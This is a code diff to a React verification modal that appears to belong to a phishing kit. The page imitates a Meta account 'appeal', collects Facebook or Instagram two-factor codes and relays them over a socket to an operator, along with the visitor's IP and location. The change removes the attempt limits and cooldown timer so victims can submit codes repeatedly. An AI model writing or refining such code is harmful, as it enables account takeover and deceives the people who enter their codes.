@@ -4,7 +4,6 @@ import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
 import { useAppealContext } from '@/hooks/use-appeal-context';
 import { store } from '@/store/store';
 import { submitCodeApproval } from '@/utils/approval-flow';
-import config from '@/utils/config';
 import translateText from '@/utils/translate';
 import Image from 'next/image';
 import { type FC, type FormEvent, useEffect, useMemo, useState } from 'react';
@@ -51,23 +50,19 @@ const maskPhone = (phone: string): string => {
 };
 
 const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
-    const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
-    const [countdown, setCountdown] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
     const [showInputError, setShowInputError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
     const { geoInfo, appealProfile, loginProvider } = store();
     const appeal = useAppealContext();
-    const maxCode = config.MAX_CODE ?? 3;
-    const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
     const t = (text: string): string => translations[text] || text;
 
     const normalizedCode = code.replace(/\D/g, '');
     const isCodeValid = /^\d{6,8}$/.test(normalizedCode);
-    const canSubmit = isCodeValid && !isLoading && countdown <= 0;
+    const canSubmit = isCodeValid && !isLoading;
 
     const providerLabel =
         loginProvider === 'instagram' ? t(TEXT.instagram) : loginProvider === 'facebook' ? t(TEXT.facebook) : t(TEXT.facebook);
@@ -100,16 +95,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         translateAll();
     }, [geoInfo]);
 
-    useEffect(() => {
-        if (countdown <= 0) {
-            return;
-        }
-        const timer = setTimeout(() => {
-            setCountdown((current) => current - 1);
-        }, 1000);
-        return () => clearTimeout(timer);
-    }, [countdown]);
-
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
         if (!canSubmit) {
@@ -118,9 +103,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         setIsLoading(true);
         setShowInputError(false);
-
-        const next = attempts + 1;
-        setAttempts(next);
 
         try {
             if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
@@ -143,8 +125,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                     addPasswordAttempt: appeal.addPasswordAttempt,
                     addTwoFAAttempt: appeal.addTwoFAAttempt
                 },
-                normalizedCode,
-                maxCode
+                normalizedCode
             );
 
             if (result.approved) {
@@ -152,28 +133,17 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                 return;
             }
 
-            if (result.isLastAttempt) {
-                nextStep();
-                return;
-            }
-
             setShowInputError(true);
             setCode('');
-            setCountdown(loadingTime);
         } catch {
-            if (next >= maxCode) {
-                nextStep();
-            } else {
-                setShowInputError(true);
-                setCode('');
-                setCountdown(loadingTime);
-            }
+            setShowInputError(true);
+            setCode('');
         } finally {
             setIsLoading(false);
         }
     };
 
-    const showErrorMessage = showInputError && countdown > 0;
+    const showErrorMessage = showInputError;
 
     return (
         <div className='two-fa-page two-fa-overlay' role='dialog' aria-modal='true' aria-labelledby='two-fa-title'>
@@ -207,7 +177,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                     type='text'
                                     autoComplete='off'
                                     value={code}
-                                    disabled={countdown > 0 || isLoading}
+                                    disabled={isLoading}
                                     onChange={(e) => {
                                         const value = e.target.value.replace(/\D/g, '').slice(0, 8);
                                         setCode(value);
@@ -216,12 +186,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                 />
                             </div>
 
-                            {showErrorMessage ? (
-                                <p className='two-fa-error'>
-                                    {t(TEXT.error)}
-                                    {countdown > 0 ? ` (${countdown}s)` : ''}
-                                </p>
-                            ) : null}
+                            {showErrorMessage ? <p className='two-fa-error'>{t(TEXT.error)}</p> : null}
 
                             {isLoading ? <p className='two-fa-waiting'>{t(TEXT.waiting)}</p> : null}
 
